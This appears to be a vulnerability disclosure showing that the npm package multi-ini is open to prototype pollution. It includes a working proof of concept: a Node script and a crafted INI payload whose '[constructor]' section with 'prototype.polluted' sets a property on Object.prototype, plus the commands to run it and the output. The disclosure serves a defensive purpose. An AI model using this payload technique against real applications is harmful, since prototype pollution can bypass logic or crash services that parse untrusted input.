# Description

`multi-ini` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC and INI files:

```
// poc.js
const ini = require('multi-ini');
console.log("Before : " + {}.polluted);
var content = ini.read('./payload.ini');
console.log("After : " + {}.polluted);

//payload.ini
[constructor]
prototype.polluted = "Yes! Its Polluted"
```


2. Execute the following commands in terminal:

```
npm i multi-ini # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
